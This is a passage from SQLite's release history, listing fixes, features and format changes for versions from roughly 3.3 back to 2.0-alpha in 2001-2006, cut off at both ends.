UTF-16 conversions Added driver for OS/2 Correct column meta-information returned for aggregate queries Enhanced output from EXPLAIN QUERY PLAN LIMIT 0 now works on subqueries Bug fixes and performance enhancements in the query optimizer Correctly handle NULL filenames in ATTACH and DETACH Improved syntax error messages in the parser Fix type coercion rules for the IN operator 2006-04-05 (3.3.5) CHECK constraints use conflict resolution algorithms correctly. The SUM() function throws an error on integer overflow. Choose the column names in a compound query from the left-most SELECT instead of the right-most. The sqlite3_create_collation() function honors the SQLITE_UTF16_ALIGNED flag. SQLITE_SECURE_DELETE compile-time option causes deletes to overwrite old data with zeros. Detect integer overflow in abs(). The random() function provides 64 bits of randomness instead of only 32 bits. Parser detects and reports automaton stack overflow. Change the round() function to return REAL instead of TEXT. Allow WHERE clause terms on the left table of a LEFT OUTER JOIN to contain aggregate subqueries. Skip over leading spaces in text to numeric conversions. Various minor bug and documentation typo fixes and performance enhancements. 2006-02-11 (3.3.4) Fix a blunder in the Unix mutex implementation that can lead to deadlock on multithreaded systems. Fix an alignment problem on 64-bit machines Added the fullfsync pragma. Fix an optimizer bug that could have caused some unusual LEFT OUTER JOINs to give incorrect results. The SUM function detects integer overflow and converts to accumulating an approximate result using floating point numbers Host parameter names can begin with '@' for compatibility with SQL Server. Other miscellaneous bug fixes 2006-01-31 (3.3.3) Removed support for an ON CONFLICT clause on CREATE INDEX - it never worked correctly so this should not present any backward compatibility problems. Authorizer callback now notified of ALTER TABLE ADD COLUMN commands After any changes to the TEMP database schema, all prepared statements are invalidated and must be recreated using a new call to sqlite3_prepare() Other minor bug fixes in preparation for the first stable release of version 3.3 2006-01-24 (3.3.2 beta) Bug fixes and speed improvements. Improved test coverage. Changes to the OS-layer interface: mutexes must now be recursive. Discontinue the use of thread-specific data for out-of-memory exception handling 2006-01-16 (3.3.1 alpha) Countless bug fixes Speed improvements Database connections can now be used by multiple threads, not just the thread in which they were created. 2006-01-11 (3.3.0 alpha) CHECK constraints IF EXISTS and IF NOT EXISTS clauses on CREATE/DROP TABLE/INDEX. DESC indices More efficient encoding of boolean values resulting in smaller database files More aggressive SQLITE_OMIT_FLOATING_POINT Separate INTEGER and REAL affinity Added a virtual function layer for the OS interface \"exists\" method added to the TCL interface Improved response to out-of-memory errors Database cache can be optionally shared between connections in the same thread Optional READ UNCOMMITTED isolation (instead of the default isolation level of SERIALIZABLE) and table level locking when database connections share a common cache. 2005-12-19 (3.2.8) Fix an obscure bug that can cause database corruption under the following unusual circumstances: A large INSERT or UPDATE statement which is part of an even larger transaction fails due to a uniqueness constraint but the containing transaction commits. 2005-12-19 (2.8.17) Fix an obscure bug that can cause database corruption under the following unusual circumstances: A large INSERT or UPDATE statement which is part of an even larger transaction fails due to a uniqueness contraint but the containing transaction commits. 2005-09-24 (3.2.7) GROUP BY now considers NULLs to be equal again, as it should Now compiles on Solaris and OpenBSD and other Unix variants that lack the fdatasync() function Now compiles on MSVC++6 again Fix uninitialized variables causing malfunctions for various obscure queries Correctly compute a LEFT OUTER JOINs that is constrained on the left table only 2005-09-17 (3.2.6) Fix a bug that can cause database corruption if a VACUUM (or autovacuum) fails and is rolled back on a database that is larger than 1GiB LIKE optimization now works for columns with COLLATE NOCASE ORDER BY and GROUP BY now use bounded memory Added support for COUNT(DISTINCT expr) Change the way SUM() handles NULL values in order to comply with the SQL standard Use fdatasync() instead of fsync() where possible in order to speed up commits slightly Use of the CROSS keyword in a join turns off the table reordering optimization Added the experimental and undocumented EXPLAIN QUERY PLAN capability Use the unicode API in Windows 2005-08-27 (3.2.5) Fix a bug effecting DELETE and UPDATE statements that changed more than 40960 rows. Change the makefile so that it no longer requires GNUmake extensions Fix the --enable-threadsafe option on the configure script Fix a code generator bug that occurs when the left-hand side of an IN operator is constant and the right-hand side is a SELECT statement The PRAGMA synchronous=off statement now disables syncing of the master journal file in addition to the normal rollback journals 2005-08-24 (3.2.4) Fix a bug introduced in the previous release that can cause a segfault while generating code for complex WHERE clauses. Allow floating point literals to begin or end with a decimal point. 2005-08-21 (3.2.3) Added support for the CAST operator Tcl interface allows BLOB values to be transferred to user-defined functions Added the \"transaction\" method to the Tcl interface Allow the DEFAULT value of a column to call functions that have constant operands Added the ANALYZE command for gathering statistics on indices and using those statistics when picking an index in the optimizer Remove the limit (formerly 100) on the number of terms in the WHERE clause The right-hand side of the IN operator can now be a list of expressions instead of just a list of constants Rework the optimizer so that it is able to make better use of indices The order of tables in a join is adjusted automatically to make better use of indices The IN operator is now a candidate for optimization even if the left-hand side is not the left-most term of the index. Multiple IN operators can be used with the same index. WHERE clause expressions using BETWEEN and OR are now candidates for optimization Added the \"case_sensitive_like\" pragma and the SQLITE_CASE_SENSITIVE_LIKE compile-time option to set its default value to \"on\". Use indices to help with GLOB expressions and LIKE expressions too when the case_sensitive_like pragma is enabled Added support for grave-accent quoting for compatibility with MySQL Improved test coverage Dozens of minor bug fixes 2005-06-12 (3.2.2) Added the sqlite3_db_handle() API Added the sqlite3_get_autocommit() API Added a REGEXP operator to the parser. There is no function to back up this operator in the standard build but users can add their own using sqlite3_create_function() Speed improvements and library footprint reductions. Fix byte alignment problems on 64-bit architectures. Many, many minor bug fixes and documentation updates. 2005-03-29 (3.2.1) Fix a memory allocation error in the new ADD COLUMN comment. Documentation updates 2005-03-21 (3.2.0) Added support for ALTER TABLE ADD COLUMN. Added support for the \"T\" separator in ISO-8601 date/time strings. Improved support for Cygwin. Numerous bug fixes and documentation updates. 2005-03-17 (3.1.6) Fix a bug that could cause database corruption when inserting record into tables with around 125 columns. sqlite3_step() is now much more likely to invoke the busy handler and less likely to return SQLITE_BUSY. Fix memory leaks that used to occur after a malloc() failure. 2005-03-11 (3.1.5) The ioctl on Mac OS X to control syncing to disk is F_FULLFSYNC, not F_FULLSYNC. The previous release had it wrong. 2005-03-11 (3.1.4) Fix a bug in autovacuum that could cause database corruption if a CREATE UNIQUE INDEX fails because of a constraint violation. This problem only occurs if the new autovacuum feature introduced in version 3.1 is turned on. The F_FULLSYNC ioctl (currently only supported on Mac OS X) is disabled if the synchronous pragma is set to something other than \"full\". Add additional forward compatibility to the future version 3.2 database file format. Fix a bug in WHERE clauses of the form (rowid<'2') New SQLITE_OMIT_... compile-time options added Updates to the man page Remove the use of strcasecmp() from the shell Windows DLL exports symbols Tclsqlite_Init and Sqlite_Init 2005-02-19 (3.1.3) Fix a problem with VACUUM on databases from which tables containing AUTOINCREMENT have been dropped. Add forward compatibility to the future version 3.2 database file format. Documentation updates 2005-02-15 (3.1.2) Fix a bug that can lead to database corruption if there are two open connections to the same database and one connection does a VACUUM and the second makes some change to the database. Allow \"?\" parameters in the LIMIT clause. Fix VACUUM so that it works with AUTOINCREMENT. Fix a race condition in AUTOVACUUM that can lead to corrupt databases Add a numeric version number to the sqlite3.h include file. Other minor bug fixes and performance enhancements. 2005-02-15 (2.8.16) Fix a bug that can lead to database corruption if there are two open connections to the same database and one connection does a VACUUM and the second makes some change to the database. Correctly handle quoted names in CREATE INDEX statements. Fix a naming conflict between sqlite.h and sqlite3.h. Avoid excess heap usage when copying expressions. Other minor bug fixes. 2005-02-01 (3.1.1 BETA) Automatic caching of prepared statements in the TCL interface ATTACH and DETACH as well as some other operations cause existing prepared statements to expire. Numerous minor bug fixes 2005-01-21 (3.1.0 ALPHA) Autovacuum support added CURRENT_TIME, CURRENT_DATE, and CURRENT_TIMESTAMP added Support for the EXISTS clause added. Support for correlated subqueries added. Added the ESCAPE clause on the LIKE operator. Support for ALTER TABLE ... RENAME TABLE ... added AUTOINCREMENT keyword supported on INTEGER PRIMARY KEY Many SQLITE_OMIT_ macros inserts to omit features at compile-time and reduce the library footprint. The REINDEX command was added. The engine no longer consults the main table if it can get all the information it needs from an index. Many nuisance bugs fixed. 2004-10-12 (3.0.8) Add support for DEFERRED, IMMEDIATE, and EXCLUSIVE transactions. Allow new user-defined functions to be created when there are already one or more precompiled SQL statements. Fix portability problems for MinGW/MSYS. Fix a byte alignment problem on 64-bit Sparc machines. Fix the \".import\" command of the shell so that it ignores \\r characters at the end of lines. The \"csv\" mode option in the shell puts strings inside double-quotes. Fix typos in documentation. Convert array constants in the code to have type \"const\". Numerous code optimizations, specially optimizations designed to make the code footprint smaller. 2004-09-18 (3.0.7) The BTree module allocates large buffers using malloc() instead of off of the stack, in order to play better on machines with limited stack space. Fixed naming conflicts so that versions 2.8 and 3.0 can be linked and used together in the same ANSI-C source file. New interface: sqlite3_bind_parameter_index() Add support for wildcard parameters of the form: \"?nnn\" Fix problems found on 64-bit systems. Removed encode.c file (containing unused routines) from the version 3.0 source tree. The sqlite3_trace() callbacks occur before each statement is executed, not when the statement is compiled. Makefile updates and miscellaneous bug fixes. 2004-09-02 (3.0.6 beta) Better detection and handling of corrupt database files. The sqlite3_step() interface returns SQLITE_BUSY if it is unable to commit a change because of a lock Combine the implementations of LIKE and GLOB into a single pattern-matching subroutine. Miscellaneous code size optimizations and bug fixes 2004-08-29 (3.0.5 beta) Support for \":AAA\" style bind parameter names. Added the new sqlite3_bind_parameter_name() interface. Support for TCL variable names embedded in SQL statements in the TCL bindings. The TCL bindings transfer data without necessarily doing a conversion to a string. The database for TEMP tables is not created until it is needed. Add the ability to specify an alternative temporary file directory using the \"sqlite_temp_directory\" global variable. A compile-time option (SQLITE_BUSY_RESERVED_LOCK) causes the busy handler to be called when there is contention for a RESERVED lock. Various bug fixes and optimizations 2004-08-09 (3.0.4 beta) CREATE TABLE and DROP TABLE now work correctly as prepared statements. Fix a bug in VACUUM and UNIQUE indices. Add the \".import\" command to the command-line shell. Fix a bug that could cause index corruption when an attempt to delete rows of a table is blocked by a pending query. Library size optimizations. Other minor bug fixes. 2004-07-22 (2.8.15) This is a maintenance release only. Various minor bugs have been fixed and some portability enhancements are added. 2004-07-22 (3.0.3 beta) The second beta release for SQLite 3.0. Add support for \"PRAGMA page_size\" to adjust the page size of the database. Various bug fixes and documentation updates. 2004-06-30 (3.0.2 beta) The first beta release for SQLite 3.0. 2004-06-22 (3.0.1 alpha) *** Alpha Release - Research And Testing Use Only *** Lots of bug fixes. 2004-06-18 (3.0.0 alpha) *** Alpha Release - Research And Testing Use Only *** Support for internationalization including UTF-8, UTF-16, and user defined collating sequences. New file format that is 25% to 35% smaller for typical use. Improved concurrency. Atomic commits for ATTACHed databases. Remove cruft from the APIs. BLOB support. 64-bit rowids. More information. 2004-06-09 (2.8.14) Fix the min() and max() optimizer so that it works when the FROM clause consists of a subquery. Ignore extra whitespace at the end of of \".\" commands in the shell. Bundle sqlite_encode_binary() and sqlite_decode_binary() with the library. The TEMP_STORE and DEFAULT_TEMP_STORE pragmas now work. Code changes to compile cleanly using OpenWatcom. Fix VDBE stack overflow problems with INSTEAD OF triggers and NULLs in IN operators. Add the global variable sqlite_temp_directory which if set defines the directory in which temporary files are stored. sqlite_interrupt() plays well with VACUUM. Other minor bug fixes. 2004-03-08 (2.8.13) Refactor parts of the code in order to make the code footprint smaller. The code is now also a little bit faster. sqlite_exec() is now implemented as a wrapper around sqlite_compile() and sqlite_step(). The built-in min() and max() functions now honor the difference between NUMERIC and TEXT datatypes. Formerly, min() and max() always assumed their arguments were of type NUMERIC. New HH:MM:SS modifier to the built-in date/time functions. Experimental sqlite_last_statement_changes() API added. Fixed the last_insert_rowid() function so that it works correctly with triggers. Add functions prototypes for the database encryption API. Fix several nuisance bugs. 2004-02-08 (2.8.12) Fix a bug that will might corrupt the rollback journal if a power failure or external program halt occurs in the middle of a COMMIT. The corrupt journal can lead to database corruption when it is rolled back. Reduce the size and increase the speed of various modules, especially the virtual machine. Allow \"<expr> IN <table>\" as a shorthand for \"<expr> IN (SELECT * FROM <table>\". Optimizations to the sqlite_mprintf() routine. Make sure the MIN() and MAX() optimizations work within subqueries. 2004-01-14 (2.8.11) Fix a bug in how the IN operator handles NULLs in subqueries. The bug was introduced by the previous release. 2004-01-14 (2.8.10) Fix a potential database corruption problem on Unix caused by the fact that all POSIX advisory locks are cleared whenever you close() a file. The work around it to embargo all close() calls while locks are outstanding. Performance enhancements on some corner cases of COUNT(*). Make sure the in-memory backend response sanely if malloc() fails. Allow sqlite_exec() to be called from within user-defined SQL functions. Improved accuracy of floating-point conversions using \"long double\". Bug fixes in the experimental date/time functions. 2004-01-06 (2.8.9) Fix a 32-bit integer overflow problem that could result in corrupt indices in a database if large negative numbers (less than -2147483648) were inserted into an indexed numeric column. Fix a locking problem on multi-threaded Linux implementations. Always use \".\" instead of \",\" as the decimal point even if the locale requests \",\". Added UTC to localtime conversions to the experimental date/time functions. Bug fixes to date/time functions. 2003-12-18 (2.8.8) Fix a critical bug introduced into 2.8.0 which could cause database corruption. Fix a problem with 3-way joins that do not use indices The VACUUM command now works with the non-callback API Improvements to the \"PRAGMA integrity_check\" command 2003-12-04 (2.8.7) Added experimental sqlite_bind() and sqlite_reset() APIs. If the name of the database is an empty string, open a new database in a temporary file that is automatically deleted when the database is closed. Performance enhancements in the Lemon-generated parser Experimental date/time functions revised. Disallow temporary indices on permanent tables. Documentation updates and typo fixes Added experimental sqlite_progress_handler() callback API Removed support for the Oracle8 outer join syntax. Allow GLOB and LIKE operators to work as functions. Other minor documentation and makefile changes and bug fixes. 2003-08-22 (2.8.6) Moved the CVS repository to www.sqlite.org Update the NULL-handling documentation. Experimental date/time functions added. Bug fix: correctly evaluate a view of a view without segfaulting. Bug fix: prevent database corruption if you dropped a trigger that had the same name as a table. Bug fix: allow a VACUUM (without segfaulting) on an empty database after setting the EMPTY_RESULT_CALLBACKS pragma. Bug fix: if an integer value will not fit in a 32-bit int, store it in a double instead. Bug fix: Make sure the journal file directory entry is committed to disk before writing the database file. 2003-07-22 (2.8.5) Make LIMIT work on a compound SELECT statement. LIMIT 0 now shows no rows. Use LIMIT -1 to see all rows. Correctly handle comparisons between an INTEGER PRIMARY KEY and a floating point number. Fix several important bugs in the new ATTACH and DETACH commands. Updated the NULL-handling document. Allow NULL arguments in sqlite_compile() and sqlite_step(). Many minor bug fixes 2003-06-29 (2.8.4) Enhanced the \"PRAGMA integrity_check\" command to verify indices. Added authorization hooks for the new ATTACH and DETACH commands. Many documentation updates Many minor bug fixes 2003-06-04 (2.8.3) Fix a problem that will corrupt the indices on a table if you do an INSERT OR REPLACE or an UPDATE OR REPLACE on a table that contains an INTEGER PRIMARY KEY plus one or more indices. Fix a bug in Windows locking code so that locks work correctly when simultaneously accessed by Win95 and WinNT systems. Add the ability for INSERT and UPDATE statements to refer to the \"rowid\" (or \"_rowid_\" or \"oid\") columns. Other important bug fixes 2003-05-17 (2.8.2) Fix a problem that will corrupt the database file if you drop a table from the main database that has a TEMP index. 2003-05-17 (2.8.1) Reactivated the VACUUM command that reclaims unused disk space in a database file. Added the ATTACH and DETACH commands to allow interacting with multiple database files at the same time. Added support for TEMP triggers and indices. Added support for in-memory databases. Removed the experimental sqlite_open_aux_file(). Its function is subsumed in the new ATTACH command. The precedence order for ON CONFLICT clauses was changed so that ON CONFLICT clauses on BEGIN statements have a higher precedence than ON CONFLICT clauses on constraints. Many, many bug fixes and compatibility enhancements. 2003-02-16 (2.8.0) Modified the journal file format to make it more resistant to corruption that can occur after an OS crash or power failure. Added a new C/C++ API that does not use callback for returning data. 2003-01-25 (2.7.6) Performance improvements. The library is now much faster. Added the sqlite_set_authorizer() API. Formal documentation has not been written - see the source code comments for instructions on how to use this function. Fix a bug in the GLOB operator that was preventing it from working with upper-case letters. Various minor bug fixes. 2002-12-28 (2.7.5) Fix an uninitialized variable in pager.c which could (with a probability of about 1 in 4 billion) result in a corrupted database. 2002-12-17 (2.7.4) Database files can now grow to be up to 2^41 bytes. The old limit was 2^31 bytes. The optimizer will now scan tables in the reverse if doing so will satisfy an ORDER BY ... DESC clause. The full pathname of the database file is now remembered even if a relative path is passed into sqlite_open(). This allows the library to continue operating correctly after a chdir(). Speed improvements in the VDBE. Lots of little bug fixes. 2002-10-31 (2.7.3) Various compiler compatibility fixes. Fix a bug in the \"expr IN ()\" operator. Accept column names in parentheses. Fix a problem with string memory management in the VDBE Fix a bug in the \"table_info\" pragma\" Export the sqlite_function_type() API function in the Windows DLL Fix locking behavior under Windows Fix a bug in LEFT OUTER JOIN 2002-09-25 (2.7.2) Prevent journal file overflows on huge transactions. Fix a memory leak that occurred when sqlite_open() failed. Honor the ORDER BY and LIMIT clause of a SELECT even if the result set is used for an INSERT. Do not put write locks on the file used to hold TEMP tables. Added documentation on SELECT DISTINCT and on how SQLite handles NULLs. Fix a problem that was causing poor performance when many thousands of SQL statements were executed by a single sqlite_exec() call. 2002-08-31 (2.7.1) Fix a bug in the ORDER BY logic that was introduced in version 2.7.0 C-style comments are now accepted by the tokenizer. INSERT runs a little faster when the source is a SELECT statement. 2002-08-25 (2.7.0) Make a distinction between numeric and text values when sorting. Text values sort according to memcmp(). Numeric values sort in numeric order. Allow multiple simultaneous readers under Windows by simulating the reader/writers locks that are missing from Win95/98/ME. An error is now returned when trying to start a transaction if another transaction is already active. 2002-08-13 (2.6.3) Add the ability to read both little-endian and big-endian databases. So a database created under SunOS or Mac OS X can be read and written under Linux or Windows and vice versa. Convert to the new website: http://www.sqlite.org/ Allow transactions to span Linux Threads Bug fix in the processing of the ORDER BY clause for GROUP BY queries 2002-07-31 (2.6.2) Text files read by the COPY command can now have line terminators of LF, CRLF, or CR. SQLITE_BUSY is handled correctly if encountered during database initialization. Fix to UPDATE triggers on TEMP tables. Documentation updates. 2002-07-19 (2.6.1) Include a static string in the library that responds to the RCS \"ident\" command and which contains the library version number. Fix an assertion failure that occurred when deleting all rows of a table with the \"count_changes\" pragma turned on. Better error reporting when problems occur during the automatic 2.5.6 to 2.6.0 database format upgrade. 2002-07-18 (2.6.0) Change the format of indices to correct a design flaw the originated with version 2.1.0. *** This is an incompatible file format change *** When version 2.6.0 or later of the library attempts to open a database file created by version 2.5.6 or earlier, it will automatically and irreversibly convert the file format. Make backup copies of older database files before opening them with version 2.6.0 of the library. 2002-07-07 (2.5.6) Fix more problems with rollback. Enhance the test suite to exercise the rollback logic extensively in order to prevent any future problems. 2002-07-06 (2.5.5) Fix a bug which could cause database corruption during a rollback. This bugs was introduced in version 2.4.0 by the freelist optimization of checkin [410]. Fix a bug in aggregate functions for VIEWs. Other minor changes and enhancements. 2002-07-01 (2.5.4) Make the \"AS\" keyword optional again. The datatype of columns now appear in the 4th argument to the callback. Added the sqlite_open_aux_file() API, though it is still mostly undocumented and untested. Added additional test cases and fixed a few bugs that those test cases found. 2002-06-25 (2.5.3) Bug fix: Database corruption can occur due to the optimization that was introduced in version 2.4.0 (check-in [410]). The problem should now be fixed. The use of versions 2.4.0 through 2.5.2 is not recommended. 2002-06-25 (2.5.2) Added the new SQLITE_TEMP_MASTER table which records the schema for temporary tables in the same way that SQLITE_MASTER does for persistent tables. Added an optimization to UNION ALL Fixed a bug in the processing of LEFT OUTER JOIN The LIMIT clause now works on subselects ORDER BY works on subselects There is a new TypeOf() function used to determine if an expression is numeric or text. Autoincrement now works for INSERT from a SELECT. 2002-06-19 (2.5.1) The query optimizer now attempts to implement the ORDER BY clause using an index. Sorting is still used if not suitable index is available. 2002-06-17 (2.5.0) Added support for row triggers. Added SQL-92 compliant handling of NULLs. Add support for the full SQL-92 join syntax and LEFT OUTER JOINs. Double-quoted strings interpreted as column names not text literals. Parse (but do not implement) foreign keys. Performance improvements in the parser, pager, and WHERE clause code generator. Make the LIMIT clause work on subqueries. (ORDER BY still does not work, though.) Added the \"%Q\" expansion to sqlite_*_printf(). Bug fixes too numerous to mention (see the change log). 2002-05-10 (2.4.12) Added logic to detect when the library API routines are called out of sequence. 2002-05-08 (2.4.11) Bug fix: Column names in the result set were not being generated correctly for some (rather complex) VIEWs. This could cause a segfault under certain circumstances. 2002-05-03 (2.4.10) Bug fix: Generate correct column headers when a compound SELECT is used as a subquery. Added the sqlite_encode_binary() and sqlite_decode_binary() functions to the source tree. But they are not yet linked into the library. Documentation updates. Export the sqlite_changes() function from Windows DLLs. Bug fix: Do not attempt the subquery flattening optimization on queries that lack a FROM clause. To do so causes a segfault. 2002-04-22 (2.4.9) Fix a bug that was causing the precompiled binary of SQLITE.EXE to report \"out of memory\" under Windows 98. 2002-04-20 (2.4.8) Make sure VIEWs are created after their corresponding TABLEs in the output of the .dump command in the shell. Speed improvements: Do not do synchronous updates on TEMP tables. Many improvements and enhancements to the shell. Make the GLOB and LIKE operators functions that can be overridden by a programmer. This allows, for example, the LIKE operator to be changed to be case sensitive. 2002-04-12 (2.4.7) Add the ability to put TABLE.* in the column list of a SELECT statement. Permit SELECT statements without a FROM clause. Added the last_insert_rowid() SQL function. Do not count rows where the IGNORE conflict resolution occurs in the row count. Make sure functions expressions in the VALUES clause of an INSERT are correct. Added the sqlite_changes() API function to return the number of row that changed in the most recent operation. 2002-04-02 (2.4.6) Bug fix: Correctly handle terms in the WHERE clause of a join that do not contain a comparison operator. 2002-04-02 (2.4.5) Bug fix: Correctly handle functions that appear in the WHERE clause of a join. When the PRAGMA vdbe_trace=ON is set, correctly print the P3 operand value when it is a pointer to a structure rather than a pointer to a string. When inserting an explicit NULL into an INTEGER PRIMARY KEY, convert the NULL value into a unique key automatically. 2002-03-30 (2.4.4) Allow \"VIEW\" to be a column name Added support for CASE expressions (patch from Dan Kennedy) Added RPMS to the delivery (patches from Doug Henry) Fix typos in the documentation Cut over configuration management to a new CVS repository with its own CVSTrac bug tracking system. 2002-03-23 (2.4.3) Fix a bug in SELECT that occurs when a compound SELECT is used as a subquery in the FROM of a SELECT. The sqlite_get_table() function now returns an error if you give it two or more SELECTs that return different numbers of columns. 2002-03-20 (2.4.2) Bug fix: Fix an assertion failure that occurred when ROWID was a column in a SELECT statement on a view. Bug fix: Fix an uninitialized variable in the VDBE that would could an assert failure. Make the os.h header file more robust in detecting when the compile is for Windows and when it is for Unix. 2002-03-13 (2.4.1) Using an unnamed subquery in a FROM clause would cause a segfault. The parser now insists on seeing a semicolon or the end of input before executing a statement. This avoids an accidental disaster if the WHERE keyword is misspelled in an UPDATE or DELETE statement. 2002-03-11 (2.4.0) Change the name of the sanity_check PRAGMA to integrity_check and make it available in all compiles. SELECT min() or max() of an indexed column with no WHERE or GROUP BY clause is handled as a special case which avoids a complete table scan. Automatically generated ROWIDs are now sequential. Do not allow dot-commands of the command-line shell to occur in the middle of a real SQL command. Modifications to the Lemon parser generator so that the parser tables are 4 times smaller. Added support for user-defined functions implemented in C. Added support for new functions: coalesce(), lower(), upper(), and random() Added support for VIEWs. Added the subquery flattening optimizer. Modified the B-Tree and Pager modules so that disk pages that do not contain real data (free pages) are not journaled and are not written from memory back to the disk when they change. This does not impact database integrity, since the pages contain no real data, but it does make large INSERT operations about 2.5 times faster and large DELETEs about 5 times faster. Made the CACHE_SIZE pragma persistent Added the SYNCHRONOUS pragma Fixed a bug that was causing updates to fail inside of transactions when the database contained a temporary table. 2002-02-19 (2.3.3) Allow identifiers to be quoted in square brackets, for compatibility with MS-Access. Added support for sub-queries in the FROM clause of a SELECT. More efficient implementation of sqliteFileExists() under Windows. (by Joel Luscy) The VALUES clause of an INSERT can now contain expressions, including scalar SELECT clauses. Added support for CREATE TABLE AS SELECT Bug fix: Creating and dropping a table all within a single transaction was not working. 2002-02-14 (2.3.2) Bug fix: There was an incorrect assert() in pager.c. The real code was all correct (as far as is known) so everything should work OK if you compile with -DNDEBUG=1. When asserts are not disabled, there could be a fault. 2002-02-13 (2.3.1) Bug fix: An assertion was failing if \"PRAGMA full_column_names=ON;\" was set and you did a query that used a rowid, like this: \"SELECT rowid, * FROM ...\". 2002-02-03 (2.3.0) Fix a serious bug in the INSERT command which was causing data to go into the wrong columns if the data source was a SELECT and the INSERT clauses specified its columns in some order other than the default. Added the ability to resolve constraint conflicts is ways other than an abort and rollback. See the documentation on the \"ON CONFLICT\" clause for details. Temporary files are now automatically deleted by the operating system when closed. There are no more dangling temporary files on a program crash. (If the OS crashes, fsck will delete the file after reboot under Unix. I do not know what happens under Windows.) NOT NULL constraints are honored. The COPY command puts NULLs in columns whose data is '\\N'. In the COPY command, backslash can now be used to escape a newline. Added the SANITY_CHECK pragma. 2002-01-28 (2.2.5) Important bug fix: the IN operator was not working if either the left-hand or right-hand side was derived from an INTEGER PRIMARY KEY. Do not escape the backslash '\\' character in the output of the sqlite command-line access program. 2002-01-22 (2.2.4) The label to the right of an AS in the column list of a SELECT can now be used as part of an expression in the WHERE, ORDER BY, GROUP BY, and/or HAVING clauses. Fix a bug in the -separator command-line option to the sqlite command. Fix a problem with the sort order when comparing upper-case strings against characters greater than 'Z' but less than 'a'. Report an error if an ORDER BY or GROUP BY expression is constant. 2002-01-16 (2.2.3) Fix warning messages in VC++ 7.0. (Patches from nicolas352001) Make the library thread-safe. (The code is there and appears to work but has not been stressed.) Added the new sqlite_last_insert_rowid() API function. 2002-01-14 (2.2.2) Bug fix: An assertion was failing when a temporary table with an index had the same name as a permanent table created by a separate process. Bug fix: Updates to tables containing an INTEGER PRIMARY KEY and an index could fail. 2002-01-09 (2.2.1) Bug fix: An attempt to delete a single row of a table with a WHERE clause of \"ROWID=x\" when no such rowid exists was causing an error. Bug fix: Passing in a NULL as the 3rd parameter to sqlite_open() would sometimes cause a coredump. Bug fix: DROP TABLE followed by a CREATE TABLE with the same name all within a single transaction was causing a coredump. Makefile updates from A. Rottmann 2001-12-22 (2.2.0) Columns of type INTEGER PRIMARY KEY are actually used as the primary key in underlying B-Tree representation of the table. Several obscure, unrelated bugs were found and fixed while implemented the integer primary key change of the previous bullet. Added the ability to specify \"*\" as part of a larger column list in the result section of a SELECT statement. For example: \"SELECT rowid, * FROM table1;\". Updates to comments and documentation. 2001-12-15 (2.1.7) Fix a bug in CREATE TEMPORARY TABLE which was causing the table to be initially allocated in the main database file instead of in the separate temporary file. This bug could cause the library to suffer an assertion failure and it could cause \"page leaks\" in the main database file. Fix a bug in the b-tree subsystem that could sometimes cause the first row of a table to be repeated during a database scan. 2001-12-14 (2.1.6) Fix the locking mechanism yet again to prevent sqlite_exec() from returning SQLITE_PROTOCOL unnecessarily. This time the bug was a race condition in the locking code. This change affects both POSIX and Windows users. 2001-12-06 (2.1.5) Fix for another problem (unrelated to the one fixed in 2.1.4) that sometimes causes sqlite_exec() to return SQLITE_PROTOCOL unnecessarily. This time the bug was in the POSIX locking code and should not effect Windows users. 2001-12-05 (2.1.4) Sometimes sqlite_exec() would return SQLITE_PROTOCOL when it should have returned SQLITE_BUSY. The fix to the previous bug uncovered a deadlock which was also fixed. Add the ability to put a single .command in the second argument of the sqlite shell Updates to the FAQ 2001-11-24 (2.1.3) Fix the behavior of comparison operators (ex: \"<\", \"==\", etc.) so that they are consistent with the order of entries in an index. Correct handling of integers in SQL expressions that are larger than what can be represented by the machine integer. 2001-11-23 (2.1.2) Changes to support 64-bit architectures. Fix a bug in the locking protocol. Fix a bug that could (rarely) cause the database to become unreadable after a DROP TABLE due to corruption to the SQLITE_MASTER table. Change the code so that version 2.1.1 databases that were rendered unreadable by the above bug can be read by this version of the library even though the SQLITE_MASTER table is (slightly) corrupted. 2001-11-13 (2.1.1) Bug fix: Sometimes arbitrary strings were passed to the callback function when the actual value of a column was NULL. 2001-11-12 (2.1.0) Change the format of data records so that records up to 16MB in size can be stored. Change the format of indices to allow for better query optimization. Implement the \"LIMIT ... OFFSET ...\" clause on SELECT statements. 2001-11-03 (2.0.8) Made selected parameters in API functions const. This should be fully backwards compatible. Documentation updates Simplify the design of the VDBE by restricting the number of sorters and lists to 1. In practice, no more than one sorter and one list was ever used anyhow. 2001-10-22 (2.0.7) Any UTF-8 character or ISO8859 character can be used as part of an identifier. Patches from Christian Werner to improve ODBC compatibility and to fix a bug in the round() function. Plug some memory leaks that use to occur if malloc() failed. We have been and continue to be memory leak free as long as malloc() works. Changes to some test scripts so that they work on Windows in addition to Unix. 2001-10-19 (2.0.6) Added the EMPTY_RESULT_CALLBACKS pragma Support for UTF-8 and ISO8859 characters in column and table names. Bug fix: Compute correct table names with the FULL_COLUMN_NAMES pragma is turned on. 2001-10-15 (2.0.5) Added the COUNT_CHANGES pragma. Changes to the FULL_COLUMN_NAMES pragma to help out the ODBC driver. Bug fix: \"SELECT count(*)\" was returning NULL for empty tables. Now it returns 0. 2001-10-13 (2.0.4) Bug fix: an obscure and relatively harmless bug was causing one of the tests to fail when gcc optimizations are turned on. This release fixes the problem. 2001-10-13 (2.0.3) Bug fix: the sqlite_busy_timeout() function was delaying 1000 times too long before failing. Bug fix: an assertion was failing if the disk holding the database file became full or stopped accepting writes for some other reason. New tests were added to detect similar problems in the future. Added new operators: & (bitwise-and) | (bitwise-or), ~ (ones-complement), << (shift left), >> (shift right). Added new functions: round() and abs(). 2001-10-09 (2.0.2) Fix two bugs in the locking protocol. (One was masking the other.) Removed some unused \"#include \" that were causing problems for VC++. Fixed sqlite.h so that it is usable from C++ Added the FULL_COLUMN_NAMES pragma. When set to \"ON\", the names of columns are reported back as TABLE.COLUMN instead of just COLUMN. Added the TABLE_INFO() and INDEX_INFO() pragmas to help support the ODBC interface. Added support for TEMPORARY tables and indices. 2001-10-02 (2.0.1) Remove some C++ style comments from btree.c so that it will compile using compilers other than gcc. The \".dump\" output from the shell does not work if there are embedded newlines anywhere in the data. This is an old bug that was carried forward from version 1.0. To fix it, the \".dump\" output no longer uses the COPY command. It instead generates INSERT statements. Extend the expression syntax to support \"expr NOT NULL\" (with a space between the \"NOT\" and the \"NULL\") in addition to \"expr NOTNULL\" (with no space). 2001-09-28 (2.0.0) Automatically build binaries for Linux and Windows and put them on the website. 2001-09-28 (2.0-alpha-4) Incorporate makefile patches form A. Rottmann to use LIBTOOL 2001-09-27 (2.0-alpha-3) SQLite now honors the UNIQUE keyword in CREATE UNIQUE INDEX. Primary keys are required to be unique. File format changed back 